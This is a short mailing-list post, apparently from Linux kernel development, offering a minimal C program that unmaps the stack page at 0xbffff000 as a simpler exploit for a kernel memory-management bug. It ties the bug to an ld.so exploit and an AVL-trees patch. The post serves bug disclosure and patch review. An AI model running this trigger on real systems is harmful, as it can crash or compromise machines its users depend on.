theres a much simpler exploit for those interested:
#include <unistd.h>
#include <sys/mman.h>
void main (void)
{
        munmap((void*)0xbffff000, 4096);
}
(the ld-so exploit had this unmap hidden implicitly in an mmap(), not
necessarily obvious at first sight.)

ps. there might be similar bugs nearby, i have not yet checked. I guess
    this whole thing is a side-effect of the AVL-trees patch, it might be
    wise to recheck that patch.
